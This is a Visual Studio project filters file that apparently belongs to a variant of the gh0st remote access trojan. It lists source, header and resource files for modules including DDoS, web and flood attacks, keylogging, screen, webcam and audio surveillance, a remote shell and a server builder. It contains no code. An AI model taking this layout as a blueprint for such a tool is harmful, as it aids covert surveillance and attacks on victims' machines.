<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{86bed11a-b886-4f67-9f33-b350347f4e7f}</UniqueIdentifier>
      <Extensions>cpp;c;cxx;rc;def;r;odl;idl;hpj;bat</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{7cef57b8-29e9-422a-908f-3c86ff02ce2b}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{20918928-4834-4793-8e25-a7b33365d0f2}</UniqueIdentifier>
      <Extensions>ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="..\common\Audio.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="AudioDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BatchCommand.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BmpToAvi.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="control\BtnST.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="include\Buffer.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BuildDialog.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="BuildView.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ChatDialog.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="CloseDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="CommuniqueDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ConfigDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="include\CpuUsage.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="CREDITSTATIC.CPP">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="CustomTabCtrl.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="DDOSAttackDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Dib.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="EventView.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FileManagerDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FileTransferModeDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FlowAttackDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="gh0st.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="gh0stDoc.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="gh0stView.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="control\HoverEdit.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Icons.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="IniFile.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="InputDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="include\IOCPServer.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="KeyBoardDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="LogonDialog.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MainFrm.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MD5.CPP">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MianZeShengMing.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MyToolsKit.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="PluginDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ScreenSpyDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SettingsView.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SEU_QQwry.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ShellDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Skin.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Splash.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="StatLink.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="StdAfx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="SystemDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="TabSDIFrameWnd.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="TaskbarNotifier.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ThemeUtil.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="TrayIcon.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="TrueColorToolBar.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UpdateDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="User.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="WebAttackDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="WebCamDlg.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="control\WinXPButtonST.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="gh0st.rc">
      <Filter>Source Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="AudioDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BatchCommand.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BmpToAvi.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="control\BtnST.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="include\Buffer.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BuildDialog.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="BuildView.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ChatDialog.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="CloseDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="CommuniqueDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ConfigDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Creditstatic.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="CustomTabCtrl.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="DDOSAttackDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Dib.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="encode.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="EventView.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FileManagerDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FileTransferModeDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FlowAttackDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="gh0st.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="gh0stDoc.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="gh0stView.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="control\HoverEdit.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Icons.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="IniFile.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="include\IOCPServer.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="KeyBoardDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="include\_OrzEx\list.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="include\List.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="LogonDialog.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\common\macros.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MainFrm.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MianZeShengMing.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MyToolsKit.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PluginDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="include\_OrzEx\queue.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="include\Queue.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ScreenSpyDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SettingsView.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SEU_QQwry.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ShellDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Skin.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Splash.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="StatLink.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="StdAfx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="include\_OrzEx\syncobj.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="SystemDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="TabSDIFrameWnd.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="TaskbarNotifier.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ThemeUtil.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Tmschema.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="TrayIcon.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="TrueColorToolBar.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="UpdateDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="User.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="WebAttackDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="WebCamDlg.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="control\WinXPButtonST.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <Image Include="res\102.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\202.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\audio.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Bitmap_4.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Bitmap_5.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\cmdshell.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\CS icon.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\DDOS攻击.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\event.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\gh0st.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\keyboard.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Logo.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Logo.gif">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\logon.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\search.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\Seting.ICO">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\ShowInfo.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="Splsh16.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\system.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\toolbar1.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\toolbar2.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\toolbar3.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\webcam.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\插件管理.ico">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\更新.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\关于.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\键盘监控.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\屏幕监控.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\轻松换肤.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\筛选.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\生成服务.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\使用工具.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\视频监控.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\退出程序.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\文件管理.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\系统管理.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\用户反馈.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\语音监听.bmp">
      <Filter>Resource Files</Filter>
    </Image>
    <Image Include="res\远程CMD.bmp">
      <Filter>Resource Files</Filter>
    </Image>
  </ItemGroup>
  <ItemGroup>
    <Media Include="res\login.wav" />
    <Media Include="res\offline.wav" />
  </ItemGroup>
  <ItemGroup>
    <Text Include="ReadMe.txt" />
  </ItemGroup>
  <ItemGroup>
    <CustomBuild Include="res\1.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\2.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\3.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\4.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\default1.bin">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\dot.cur">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="res\gh0st.rc2">
      <Filter>Resource Files</Filter>
    </CustomBuild>
    <CustomBuild Include="GetRand.dll" />
    <CustomBuild Include="res\install.exe" />
    <CustomBuild Include="res\lanse.she" />
  </ItemGroup>
</Project>